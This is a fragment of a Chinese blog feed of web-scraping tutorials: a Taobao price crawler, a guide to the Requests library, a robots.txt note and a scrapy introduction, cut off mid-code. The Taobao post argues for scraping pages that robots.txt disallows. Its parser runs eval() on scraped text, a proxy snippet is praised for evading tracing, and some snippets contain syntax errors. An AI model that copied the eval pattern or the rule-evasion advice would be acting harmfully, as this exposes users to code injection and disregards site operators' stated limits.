    <content type="html"><![CDATA[<h3 id="淘宝商品信息定向爬虫">淘宝商品信息定向爬虫</h3><p>目标：获取淘宝商品搜索页面的信息，提取其中的商品名称和价格</p><p>理解：淘宝的搜索接口、翻页处理</p><p>技术路线：requests-re</p><p>:one:在搜索栏输入“书包”，查看地址栏的变化，找到接口</p><img src="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/a.jpg" class=""><img src="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/b.jpg" class=""><ul><li><p>完整（起始页）：(<a href="https://s.taobao.com/search?q=%E4%B9%A6%E5%8C%85&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306">https://s.taobao.com/search?q=书包&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306</a>)</p></li><li><p>:star:<a href="https://s.taobao.com/search?q=%E4%B9%A6%E5%8C%85%EF%BC%9A%E5%8F%AF%E4%BB%A5%E4%BD%9C%E4%B8%BA%E5%90%91%E6%B7%98%E5%AE%9D%E6%8F%90%E4%BE%9B%E5%85%B3%E9%94%AE%E8%AF%8D%E7%9A%84%E6%8E%A5%E5%8F%A3">https://s.taobao.com/search?q=书包：可以作为向淘宝提供关键词的接口</a></p></li><li><p>第二页：(<a href="https://s.taobao.com/search?q=%E4%B9%A6%E5%8C%85&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&amp;bcoffset=1&amp;ntoffset=1&amp;p4ppushleft=2%2C48&amp;==s=44==">https://s.taobao.com/search?q=书包&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&amp;bcoffset=1&amp;ntoffset=1&amp;p4ppushleft=2%2C48&amp;==s=44==</a>)</p></li><li><p>第三页：(<a href="https://s.taobao.com/search?q=%E4%B9%A6%E5%8C%85&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&amp;bcoffset=-2&amp;ntoffset=-2&amp;p4ppushleft=2%2C48&amp;==s=88==">https://s.taobao.com/search?q=书包&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.jianhua.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&amp;bcoffset=-2&amp;ntoffset=-2&amp;p4ppushleft=2%2C48&amp;==s=88==</a>)</p></li><li><p>:star:找到第二页和第三页的不同：最后的s=…（每一页恰好有44个商品，猜测s为起始商品的编号）</p></li></ul><p>:two:定向爬虫的可行性</p><p>查看robots协议：robots协议对所有爬虫限定了disallow根目录的相关约定。淘宝的搜索页面是不允许爬虫对它的信息进行爬取的（爬虫对淘宝的访问，跟个人对淘宝的访问的频率一样，并不体现对淘宝的性能骚扰，就可以用）</p><img src="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/c.jpg" class=""><p>:three:程序的结构设计</p><ul><li>1、提交商品搜索请求，循环获取页面</li><li>2、对于每个页面，提取商品名称和价格信息</li><li>3、将信息输出到屏幕上</li></ul><p>:four:从网页源代码中找到信息</p><p>1、价格由view price这个键值对组成</p><img src="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/d-16426689127861.jpg" class=""><p>2、名字由title这个键值对组成</p><img src="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/e.jpg" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getHTMLText</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        kv = &#123;<span class="hljs-string">&#x27;user-agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0&#x27;</span>,<br>              <span class="hljs-string">&#x27;cookie&#x27;</span>: <span class="hljs-string">&#x27;...&#x27;</span>&#125;<br>        r = requests.get(url, headers=kv, timeout=<span class="hljs-number">30</span>)<br>        r.raise_for_status()<br>        r.encoding = r.apparent_encoding<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;获取页面信息失败&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parsePage</span>(<span class="hljs-params">ilt, html</span>):<br>    <span class="hljs-keyword">try</span>:<br>        plt = re.findall(<span class="hljs-string">r&#x27;\&quot;view_price\&quot;\:\&quot;[\d\.]*\&quot;&#x27;</span>, html)  <span class="hljs-comment"># （用反斜杠）首先检索view price这个字符串，并获得以\d和.形成的信息</span><br>        tlt = re.findall(<span class="hljs-string">r&#x27;\&quot;raw_title\&quot;\:\&quot;.*?\&quot;&#x27;</span>, html)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plt)):<br>            price = <span class="hljs-built_in">eval</span>(plt[i].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])  <span class="hljs-comment"># eval()将字符串最外层的单引号和双引号去掉，split获得键值对后面的部分</span><br>            title = <span class="hljs-built_in">eval</span>(tlt[i].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>])<br>            ilt.append([price, title])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取商品信息失败&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printGoodsList</span>(<span class="hljs-params">ilt</span>):<br>    tplt = <span class="hljs-string">&quot;&#123;:4&#125;\t&#123;:8&#125;\t&#123;:16&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(tplt.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;序号&quot;</span>, <span class="hljs-string">&quot;价格&quot;</span>, <span class="hljs-string">&quot;商品名称&quot;</span>))<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> ilt:<br>        count = count + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(tplt.<span class="hljs-built_in">format</span>(count, g[<span class="hljs-number">0</span>], g[<span class="hljs-number">1</span>]))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    goods = <span class="hljs-string">&#x27;书包&#x27;</span>  <span class="hljs-comment"># 搜索的关键词</span><br>    depth = <span class="hljs-number">3</span>  <span class="hljs-comment"># 搜索的深度，3页</span><br>    start_url = <span class="hljs-string">&#x27;https://s.taobao.com/search?q=&#x27;</span> + goods<br>    infoList = []  <span class="hljs-comment"># 定义输出结果的变量</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(depth):  <span class="hljs-comment"># 对每一页做单独的处理</span><br>        <span class="hljs-keyword">try</span>:  <span class="hljs-comment"># 如果某个页面的爬取出现异常，则进行下一个页面的爬取</span><br>            url = start_url + <span class="hljs-string">&#x27;&amp;s=&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">44</span> * i)<br>            html = getHTMLText(url)<br>            parsePage(infoList, html)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    printGoodsList(infoList)<br><br><br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>1-request</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB1Requests/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB1Requests/</url>
    
    <content type="html"><![CDATA[<h3 id="Requests库">Requests库</h3><p>官方文档：<a href="https://docs.python-requests.org/">https://docs.python-requests.org/</a></p><ul><li><h5 id="使用">使用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">r = requests.get(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(r))  <span class="hljs-comment"># &lt;class &#x27;requests.models.Response&#x27;&gt;</span><br></code></pre></td></tr></table></figure></li><li><h5 id="Response对象的属性">Response对象的属性</h5><ul><li><p>r.status_code：HTTP请求的返回状态，200表示成功</p></li><li><p>r.text：HTTP相应内容的字符串形式，即url对应的页面内容</p></li><li><p>r.encoding：从HTTP header中猜测的响应内容编码方式</p></li><li><p>r.apparent_encoding：从内容中分析出的响应内容编码方式（备选编码方式）</p></li><li><p>r.content：HTTP响应内容的二进制形式</p><ul><li>比如从url链接上获得一张图片，图片里的资源是以二进制的形式存储的，就可以通过r.content来还原这个图片</li></ul></li></ul></li><li><h5 id="理解Response的编码">理解Response的编码</h5><ul><li><p>r.encoding：如果header中不存在charset，则认为编码为ISO-8859-1（不能解析中文）</p></li><li><p>r.apparent_encoding：根据网页内容分析出的编码方式</p></li><li><p>当用encoding不能正确解码返回的内容时，用apparent_encoding</p></li><li><pre><code class="language-python">import requestsr = requests.get(&quot;http://www.baidu.com&quot;)print(r.status_code)print(r.text)  # 存在乱码print(r.encoding)  # 查看它的编码# ISO-8859-1print(r.apparent_encoding)# utf-8r.encoding = 'utf-8'  # 用备选编码替换print(r.text)  # 乱码变成中文信息<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stata"><br>    <br><br><span class="hljs-comment">* ##### :star:reques库的异常</span><br><br>  :<span class="hljs-keyword">one</span>:Requests库的6种连接异常<br><br><span class="hljs-comment">  * requests.ConnectionError：网络连接异常，如DNS查询失败、（服务器的防火墙）拒绝连接等</span><br><span class="hljs-comment">  * requests.HTTPError：HTTP错误异常</span><br><span class="hljs-comment">  * requests.URLRequired：URL缺失异常</span><br><span class="hljs-comment">  * requests.TooManyRedirects：超过最大重定向次数，产生重定向异常</span><br><span class="hljs-comment">  * requests.ConnectTimeout：连接**远程服务器**超时异常</span><br><span class="hljs-comment">  * requests.Timeout：请求URL超时，产生超时异常（发出url请求到获得内容的**整个过程**）</span><br><br>   :<span class="hljs-keyword">two</span>:r.raise_for_status( )：如果不是200，产生异常requests.HTTPError<br><br>   :three:通用代码框架（使访问或爬取网页变得更加有效、稳定）<br><br>  ~~~python<br>  import requests<br>  <br>  <br>  def getHTMLTEX(url):<br>      try:<br>          r = requests.<span class="hljs-built_in">get</span>(url, timeout=30)<br>          r.raise_for_status()  # ⭐如果状态不是200，引发HTTPError异常<br>          r.encoding = r.apparent_encoding<br>          <span class="hljs-keyword">return</span> r.text<br>      except:<br>          <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;产生异常&quot;</span><br>  <br>  <br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>      url = <span class="hljs-string">&quot;http://www.baidu.com&quot;</span><br>      <span class="hljs-keyword">print</span>(getHTMLTEX(url))<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><h5 id="Requests库的7个主要方法">Requests库的7个主要方法</h5><p>:one:requests.request( )：构造一个请求，支撑以下各方法的基础方法</p><p><em><em>requests.request(method,url,</em> <em>kwargs )</em></em></p><ul><li><h6 id="method：请求方法，对应get-put-post等7种">method：请求方法，对应get/put/post等7种</h6><p>GET  HEAD  POST  PUT  PATCH  delete  OPTIONS</p><p>(OPTIONS：向服务器获取一些服务器跟客户端能够打交道的参数，并不与获取资源直接相关)</p></li><li><h6 id="kwargs：控制访问的参数，均为可选项">**kwargs：控制访问的参数，均为可选项</h6><ul><li>params：字典或字节序列，作为参数增加到url中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">kv = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>:<span class="hljs-string">&#x27;value1&#x27;</span>,<span class="hljs-string">&#x27;key2&#x27;</span>=<span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br>r = requests.request(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://xxx/aa&#x27;</span>,params=kv)<br><span class="hljs-built_in">print</span>(r.url)<br>--&gt;http://xxx/aa?key1=value1&amp;key2=value2<br></code></pre></td></tr></table></figure><p>:small_blue_diamond: 将键值对增加到url中，使得url再去访问时，不仅访问这个资源，而同时代入了一些参数，服务器可以接受这些参数并根据这些参数筛选部分资源并返回。</p><ul><li><p>:star: data：字典、字节序列或文件对象，作为Request的内容</p><p>向服务器提供或提交资源时使用</p></li><li><p>:star:json：JSON格式的数据，作为Request的内容</p><p>将内容赋值到服务器的json域上</p></li><li><p>:star:headers：字典，HTTP定制头</p><p>模拟浏览器</p></li><li><p>cookies：字典或CookieJar，Request中的cookie</p><p>从HTTP协议中解析cookie</p></li><li><p>auth：元组，支持HTTP认证功能</p></li><li><p>files：字典类型，传输文件</p><p>向某个链接提交某个特定文件</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">f = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.xls&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br>r = requests.request(<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;http://xxx/xx&#x27;</span>,files=f)<br></code></pre></td></tr></table></figure><ul><li>timeout：设定超时时间，秒为单位</li><li>proxies：字典类型，设定访问代理服务器，可以增加登录认证</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">pxs = &#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&#x27;http://user:pass@10.10.10.1:1234&#x27;</span><br><span class="hljs-string">&#x27;https&#x27;</span>:<span class="hljs-string">&#x27;https://10.10.10.1:4321&#x27;</span>&#125;<br><br>r = requests.request(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>,proxies=pxs)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">在访问百度时所使用的IP地址就是代理服务器的IP地址</span><br><span class="hljs-string">可以有效地隐藏用户爬取网页地源的IP地址的信息，有效地防止逆追踪</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>allow_redirects：True/False，默认为True，重定向开关</li><li>stream：True/False，默认为True，获取内容立即下载开关</li><li>verify：True/False，默认为True，认证SSL证书开关</li><li>cert：本地SSL证书路径</li></ul></li></ul><p>:two:requests.get( )：获取HTML网页的主要方法，对应于HTTP的GET</p><p><em><em>requests.get(url,params=None,</em> <em>kwargs )</em></em></p><p>参数与request相同</p><p>:three:requests.head( )：获取HTML网页头信息的主要方法，对应于HTTP的HEAD</p><p><em><em>requests.head(url，</em> <em>kwargs )</em></em></p><p>:four:requests.post( )：向HTML网页提交POST请求的方法，对应于HTTP的POST</p><p><em><em>requests.post(url,data=None,json=None,</em> <em>kwargs )</em></em></p><p>:five:requests.put( )：向HTML网页提交PUT请求的方法，对应于HTTP的PUT</p><p><em><em>requests.put(url,data=None,</em> <em>kwargs )</em></em></p><p>:six:requests.patch( )：向HTML网页提交局部修改请求，对应于HTTP的PATCH</p><p><em><em>requests.patch(url,data=None,</em> <em>kwargs  )</em></em></p><p>:seven:requests.delete( )：向HTML网页提交删除请求，对应于HTTP的DELETE</p><p><em><em>requests.delete(url,</em> <em>kwargs )</em></em></p></li><li><h5 id="PATCH和PUT的区别">PATCH和PUT的区别</h5><ul><li>采用PATCH，仅向URL提交需要修改的某个字段的局部更新请求</li><li>采用PUT，必须将所有字段一并提交到URL，未提交字段会被删除</li><li>PATCH的主要好处：节省网络带宽</li></ul></li><li><h5 id="post和put">post和put</h5><p>post：向URL post一个字典或者一个键值对时，会被默认地存储到表单的字段下，提交字符串会被默认存到data中。（根据用户提交的信息在服务器上做相关的处理）</p><p>put：和post类似，但是能将原有的数据覆盖掉</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2-限制</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB2/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB2/</url>
    
    <content type="html"><![CDATA[<img src="/2022/02/16/%E7%88%AC%E8%99%AB2/11.jpg" class=""><h3 id="网络爬虫的限制">网络爬虫的限制</h3><ul><li><p>判断User-Agent进行限制</p><p>检查来访HTTP协议头的User-Agent域，只相应浏览器或友好爬虫的访问</p></li><li><p>发布公告：Robots协议</p><p>告知所有爬虫网站的爬取策略，要求爬虫遵守</p></li></ul><h3 id="Robots协议">Robots协议</h3><ul><li>Robots Exclusion Standard 网络爬虫排除标准</li><li>作用：告知所有爬虫网站的爬取策略，要求爬虫遵守</li><li>形式：在网站根目录下的robots.txt文件写明</li><li>使用：<ul><li>网络爬虫：自动或人工识别robots.txt，再进行内容爬取</li><li>约束性：Robots协议是建议但非约束，网络爬虫可以不遵守，但存在法律风险</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>7-scrapy框架</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB7scrapy%E6%A1%86%E6%9E%B6/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB7scrapy%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="scrapy爬虫框架结构">scrapy爬虫框架结构</h3><img src="/2022/02/16/%E7%88%AC%E8%99%AB7scrapy%E6%A1%86%E6%9E%B6/d.jpg" class=""><h5 id="数据流的3个路径">数据流的3个路径</h5><p>:one:1、engine从spider处获得爬取请求（requests）</p><p>​  2、engine将爬取请求转发给scheduler，用于调度</p><p>:two:3、engine从scheduler处获得下一个要爬取的请求</p><p>​  4、engine将爬取请求通过中间件发送给downloader</p><p>​  5、爬取网页后，downloader形成响应（respomse），通过中间件发给engine</p><p>​  6、engine将收到的响应通过中间件发给spider处理</p><p>:three:7、spider处理响应后产生爬取项（scraped item）和新的爬取请求（requests）给engine</p><p>​  8、engine将爬取项发送给item pipeline（框架出口）</p><p>​  9、engine将爬取请求发送给scheduler</p><h5 id="数据流的出入口">数据流的出入口</h5><p>engine控制各模块数据流，不断从scheduler处获取爬取请求，直至请求为空</p><p>框架入口：spider的初始爬取请求</p><p>框架出口：item pipeline</p><h5 id="解析">解析</h5><h6 id="engine">engine</h6><ul><li>控制所有模块之间的数据流</li><li>根据条件触发事件</li><li>不需要用户修改</li></ul><h6 id="downloader">downloader</h6><ul><li>根据请求下载网页</li><li>不需要用户修改</li></ul><h6 id="scheduler">scheduler</h6><ul><li>对所有爬取请求进行调度管理</li><li>不需要用户修改</li></ul><h6 id="downloader-middleware">downloader middleware</h6><ul><li>目的：实现engine、scheduler和downloader之间进行用户可配置的控制</li><li>功能：修改、丢弃、新增请求或响应</li><li>用户可以编写代码</li></ul><h6 id="spider-核心">spider(核心)</h6><ul><li>解析downloader返回的响应（response）</li><li>产生爬取项（spider item）</li><li>产生额外的爬取请求（request）</li><li>需要用户编写配置代码</li><li>向整个框架提供了最初始的访问链接，同时对每次爬取回来的内容进行解析，再次产生新的爬取请求，并且从内容中分析出、提取出相关的数据</li></ul><h6 id="item-pipelines">item pipelines</h6><ul><li>以流水方式处理spider产生的爬取项</li><li>由一组操作顺序组成，类似流水线，每个操作是一个item pipeline类型</li><li>可能的操作包括：清理、检验和查重爬取项中的HTML数据，将数据存储到数据库</li><li>需要用户编写代码</li></ul><h6 id="spider-middleware">spider middleware</h6><ul><li>目的：对请求和爬取项的在处理</li><li>功能：修改、丢弃、新增请求或爬取项</li><li>用户可以编写配置代码</li></ul><h5 id="requests和scrapy的对比">requests和scrapy的对比</h5><h6 id="相同点">相同点</h6><ul><li>都可以进行页面请求和爬取，是python爬虫的两个重要技术路线</li><li>可用性都很好，文档丰富，入门简单</li><li>都没有处理js、提交表单、应对验证码等功能（可扩展）</li></ul><h6 id="相异点：">相异点：</h6><ul><li>requests<ul><li>页面级爬虫</li><li>功能库</li><li>并发性考虑不足，性能较差</li><li>重点在于页面下载</li><li>定制灵活</li></ul></li><li>scrapy<ul><li>网站级爬虫</li><li>框架</li><li>并发性好，性能较高</li><li>重点在于爬虫结构</li><li>一般定制灵活，深度定制困难</li></ul></li></ul><h3 id="scrapy爬虫的常用命令">scrapy爬虫的常用命令</h3><h5 id="scrapy命令行格式：">scrapy命令行格式：</h5><p>scrapy &lt; command &gt; [options] [ args]</p><h5 id="常用命令">常用命令</h5><table><thead><tr><th>命令</th><th>说明</th><th>格式</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新工程</td><td>scrapy startproject &lt; name&gt; [ dir]</td></tr><tr><td>genspider</td><td>创建一个爬虫</td><td>scrapy genspider [options] &lt; name&gt; &lt; domain&gt;</td></tr><tr><td>settings</td><td>获得爬虫的配置信息</td><td>scrapy settings [ options]</td></tr><tr><td>crawl</td><td>运行一个爬虫</td><td>scrapy crawl &lt; spider&gt;</td></tr><tr><td>list</td><td>列出工程中所有爬虫</td><td>scrapy list</td></tr><tr><td>shell</td><td>启动URL调试命令</td><td>scrapy shell [ url]</td></tr></tbody></table><h3 id="实例">实例</h3><h5 id="爬取demo-html">爬取demo.html</h5><p>url：<a href="https://python123.io/ws/demo.html">This is a python demo page (python123.io)</a></p><p>:one:建立一个scrapy爬虫工程</p><ul><li><p>打开cmd，选取一个目录，执行：scrapy startproject python123demo</p></li><li><p>生成的目录：</p><ul><li><p>python123demo----&gt;外层目录，scrapy框架的用户自定义的python代码</p></li><li><p>scrapy.cfg----&gt;部署scrapy爬虫的配置文件（部署：将爬虫放在特定的服务器上，并且在服务器配置好相关的操作接口）</p></li><li><p><img src="scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6.assets/b.jpg" alt="b"></p></li><li><p>__ init __.py----&gt;初始化脚本，无需修改</p></li><li><p>items.py----&gt;items代码模板（继承类）</p></li><li><p>middlewares.py----&gt;middlewares代码模板（继承类）</p></li><li><p>pipelines.py----&gt;pipelines代码模板（继承类）</p></li><li><p>settings.py----&gt;spider爬虫的配置文件</p></li><li><p>spiders/----&gt;spiders代码模板目录（继承类）</p></li><li><p>__ pycache __/----&gt;缓存目录，无需修改</p><img src="/2022/02/16/%E7%88%AC%E8%99%AB7scrapy%E6%A1%86%E6%9E%B6/a.jpg" class=""><img src="/2022/02/16/%E7%88%AC%E8%99%AB7scrapy%E6%A1%86%E6%9E%B6/c.jpg" class=""></li></ul></li></ul><p>:two:在工程中产生一个scrapy爬虫</p><p><strong>scrapy genspider demo <a href="http://python123.io">python123.io</a></strong> ：生成一个名称为demo的spider（<a href="http://demo.py">demo.py</a>）</p><ul><li>面向对象的形式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&#x27;demo&#x27;</span>  <span class="hljs-comment"># 当前爬虫的名字</span><br>    allowed_domains = [<span class="hljs-string">&#x27;python123.io&#x27;</span>]  <span class="hljs-comment"># 最开始用户提交给命令行的域名</span><br>    start_urls = [<span class="hljs-string">&#x27;http://python123.io/&#x27;</span>]  <span class="hljs-comment"># 包含一个或多个url，scrapy框架所要爬取的初始页面</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):  <span class="hljs-comment"># 原本为解析页面的空方法（pass）</span><br>        <span class="hljs-keyword">pass</span><br>        <br>parse()用于处理响应，解析内容形成字典，发现新的url爬取请求<br></code></pre></td></tr></table></figure><p>:three:配置产生的spider爬虫（<a href="http://xn--demo-486fx14i.py">修改demo.py</a>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&#x27;demo&#x27;</span>  <span class="hljs-comment"># 当前爬虫的名字</span><br>    <span class="hljs-comment"># allowed_domains = [&#x27;python123.io&#x27;]  # 最开始用户提交给命令行的域名</span><br>    start_urls = [<span class="hljs-string">&#x27;https://python123.io/ws/demo.html&#x27;</span>]  <span class="hljs-comment"># 包含一个或多个url，scrapy框架所要爬取的初始页面</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):  <span class="hljs-comment"># 原本为解析页面的空方法（pass）</span><br>        fname=response.url.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(fname,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(response.body)<br>        self.log(<span class="hljs-string">&#x27;Save file %s.&#x27;</span>%name)<br></code></pre></td></tr></table></figure><p>:four:运行爬虫，获取网页</p><p><strong>scrapy crawl demo</strong></p><h3 id="yield关键字的使用">yield关键字的使用</h3><h5 id="概念">概念</h5><ul><li>yield &lt;—&gt;生成器</li><li>生成器：<ul><li>不断产生值的函数</li><li>包含yield语句的函数是一个生成器</li><li>生成器每次产生一个值（yield语句），函数被冻结，被唤醒后再产生一个值</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 